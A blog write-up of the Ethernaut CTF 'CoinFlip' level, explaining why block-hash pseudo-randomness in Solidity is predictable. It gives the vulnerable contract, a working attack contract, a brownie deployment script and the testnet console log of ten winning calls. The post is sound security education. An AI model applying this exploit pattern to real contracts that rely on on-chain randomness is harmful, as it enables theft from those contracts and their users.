---
title: Ethernaut - Level 03 - Coinflip
date: 2022-08-11
---
{{<figure src="../images/coinflip-3.svg" caption="Image courtesy of OpenZeppelin">}}
## Ethernaut 03 - Coinflip
The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

This level illustrates one of the most serious pitfalls in the smart contracts, the generation of pseudo-random numbers.

According to [Chainlink](https://blog.chain.link/random-number-generation-solidity/):

> Random number generation (RNG) in solidity must be done by sending a seed to an off-chain resource like an [oracle](https://chain.link/education/blockchain-oracles), which must then return the generated random number and verifiable proof back to the smart contract.  Random numbers cannot be generated natively in Solidity due to the determinism of blockchains.

Unfortunately, developers currently attempt to create pseudo-randomness in Ethereum by hashing variables that are unique or difficult to tamper with, such as `block height`, `sender address` or `transaction timestamp`. Ethereum also offers two main cryptographic hashing functions, SHA-3 and [KECCAK256](https://keccak.team/keccak_specs_summary.html), which hash the result of concatenating the variables mentioned before. 

Notwithstanding, using custom implementations to calculate pseudo-random numbers (our case with this contract)  in smart contracts makes them vulnerable to attacks. Attackers who know the input, can revert the process and guess the outcome and that is exactly what occurs with this contract. 

## Where is the vulnerability?
The contract has a flaw with its flipping algorithm, specifically with the use of `block.number` and `blockhash` as a form of randomness. According to Solidity official documentation:

> The timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money.

In this particular level, a malicious user can calculate the correct answer if they run the same algorithm in their attack function before calling the contract’s `flip` function.

## Hacking the contract
Once again, let’s use brownie to solve this challenge by creating a malicious contract that mimics the original contract with some minor differences:

```solidity {lineos=table,hl_lines=[24,25,26,27,28,29,30,31,32,33,34,35,36,37],lineofstart=1}
//SDPX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './safemath.sol';

// Import the interface for the original CoinFlip contract
// so we can invoke the flip method from this contract
import 'interfaces/coinflipInterface.sol';

contract CoinFlipAttack {
    // CoinFlip interface's object;
    CoinFlipInterface coinflipContract;

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Constructor will initialize the coinflipContract object using the target's address
    // See attack.py to see how this constructor is called.
    constructor(address _address) public {
        coinflipContract = CoinFlipInterface(_address);
    }

    // Function that recreates the contract's logic and pass the expected value
    function attack() public {
        // Calculate the expected value based on block.number and blockhash
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        
        bool side = coinFlip == 1 ? true : false;

        // Pass the expected value to the original contract's flip method
        bool result = coinflipContract.flip(side);

        // Continue only if we have provided the right value. We know this must be
        // true if the value passed is right, otherwise it will be false
        require(result);
    }

    // Destructor
    function destroy() public {
        selfdestruct(msg.sender);
    }
     
}
```

The idea behind this malicious contract is to obtain the pseudo-random value before the original contract is called, and provide the expected value as parameter to the original `flip` method, then eval if our guess has been correct.

Our project will also have two different interfaces, one for the original contract (`coinflipInterface.sol`) and an additional one for our malicious contract (`coinflipAttackInterface.sol`).

```solidity {lineos=table,hl_lines=[3],lineofstart=1}
pragma solidity ^0.6.0;

interface CoinFlipAttackInterface {
    function attack() external;
    function destroy() external;
}
```

```solidity {lineos=table,hl_lines=[3],lineofstart=1}
pragma solidity ^0.6.0;

interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}
```

These interfaces define which methods can be called from another contract, and we will use this in our `attack.py` script, which looks as follows:

```solidity
from brownie import accounts, config, interface, web3, CoinFlip, CoinFlipAttack

def attack(target, hacker):
    ''' 
    We will deploy our attack contract passing the constructor arguments,
    and a dictionary of transaction parameters as the final argument, including
    a from value that specifies the Account to deploy the contract from
    ''' 
    deploy_attack = CoinFlipAttack.deploy(target, {"from": hacker})

    '''
    Create object from an arbitrary address using the Accounts.at method
    '''
    coinflip = CoinFlip.at(target)
    print(f'Address originating the attack:  {deploy_attack.address}')

    # Execute 10 times the hack attack
    for i in range (0, 10):
        deploy_attack.attack({'from': hacker, 'gas_limit':250000, 'allow_revert': True})
    print(f'Number:  {coinflip.consecutiveWins()}')
    deploy_attack.destroy({'from': hacker})
    
def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack(target, hacker)
```

The attack vector is straightforward and can be summarized in few steps:

1. We will start deploying our malicious contract, by passing the original CoinFlip contract’s address (`target`) and our wallet address within the `from` field, which is used to specify the Account to deploy the contract form.
2. We use the `at` method (as defined in the [core-account.rst](https://github.com/eth-brownie/brownie/blob/master/docs/core-accounts.rst) documentation) to create an object from an arbitrary address. Useful later to obtain the number of `consecutiveWins`.
3. Last, our attack is executed ten times through the `deploy_attack.attack` call, which will call the `hack` method defined in the `coinflipattack.sol` contract.
4. Once our attack has guessed ten times the coin’s flip, we will proceed to destroy our contract and submit the instance, successfully passing this challenge.

To execute this attack, just run the following command:

```python
root@vmi828562 ~/r/e/coinflip-03 [1]# brownie run attack main "0x9c654f6E399F3b39415DcA321A0b50921C31917d" --network rinkeby
Brownie v1.18.1 - Python development framework for Ethereum

Coinflip03Project is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x237057edd9d989fc3318ab0d82d05fd51748154d97c8c6ecd4ca2d06522ba8c9
  Gas price: 1.16223081 gwei   Gas limit: 235118   Nonce: 44
  CoinFlipAttack.constructor confirmed   Block: 10723036   Gas used: 213744 (90.91%)
  CoinFlipAttack deployed at: 0x30AFa4bA16e2946ac1063d8c86f986B0E98a2E38

Address originating the attack:  0x30AFa4bA16e2946ac1063d8c86f986B0E98a2E38
Transaction sent: 0x54464cdd860d9b2fd3577d530cfc5a74cac61d34369a18cbc1fe4b62942672fb
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 45
  CoinFlipAttack.attack confirmed   Block: 10723037   Gas used: 41712 (16.68%)

Transaction sent: 0x9ef82da3aa6760651b625ac94bb69bce4284204834346a830158a80733e6a626
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 46
  CoinFlipAttack.attack confirmed   Block: 10723038   Gas used: 41732 (16.69%)

Transaction sent: 0xca68cbe9d0eb04898f5c6e6dbdaa78a9deb6ef197d863762340fcedce17196ca
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 47
  CoinFlipAttack.attack confirmed   Block: 10723039   Gas used: 41712 (16.68%)

Transaction sent: 0x1a38621634659e8069b90f1361be1d140927475174ce8809f3d7e6929c02f287
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 48
  CoinFlipAttack.attack confirmed   Block: 10723040   Gas used: 41712 (16.68%)

Transaction sent: 0xfaac369cce1c7464e9c1604301be838914788d1c5e301feee29a6505ec2c9ece
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 49
  CoinFlipAttack.attack confirmed   Block: 10723041   Gas used: 41732 (16.69%)

Transaction sent: 0xb19810a5c590ffc470528a20e618e475ec5b45ce099e14e728b63464fd2ad2fa
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 50
  CoinFlipAttack.attack confirmed   Block: 10723042   Gas used: 41712 (16.68%)

Transaction sent: 0xbff2dceb8092093d02c937f0e5ca4f17443db4715502c688cbc1ff32c95bf270
  Gas price: 1.16223081 gwei   Gas limit: 250000   Nonce: 51
  CoinFlipAttack.attack confirmed   Block: 10723043   Gas used: 41712 (16.68%)

Transaction sent: 0xc5169fd82123c87be97647c9ffec276dc9ad358ac07ff7cccfcf170174f22f08
  Gas price: 1.162230809 gwei   Gas limit: 250000   Nonce: 52
  CoinFlipAttack.attack confirmed   Block: 10723044   Gas used: 41732 (16.69%)

Transaction sent: 0xc0d29cbb0ba6325e72ae0ea2e3f1151d06b1824ccc200b1b1b8851bd02561d40
  Gas price: 1.162230809 gwei   Gas limit: 250000   Nonce: 53
  CoinFlipAttack.attack confirmed   Block: 10723045   Gas used: 41712 (16.68%)

Transaction sent: 0x946840838971c60d46bfaa8757b34db4bb4701830bd38bf0d56a958c1650bec9
  Gas price: 1.162230809 gwei   Gas limit: 250000   Nonce: 54
  CoinFlipAttack.attack confirmed   Block: 10723046   Gas used: 41732 (16.69%)

Number:  10
Transaction sent: 0x86c6605cc6f40cece54143ac4fe154421f4a979ef427fda6938b4222295a2956
  Gas price: 1.16223081 gwei   Gas limit: 28796   Nonce: 55
  CoinFlipAttack.destroy confirmed   Block: 10723047   Gas used: 26179 (90.91%)
```

## TakeAways

It is important to remember that our code is publicly accessible once it has been deployed into the blockchain, and therefore, anyone can see our logic. Also, true randomness is near impossible to achieve in native Solidity, and the use of Oracles is highly recommended.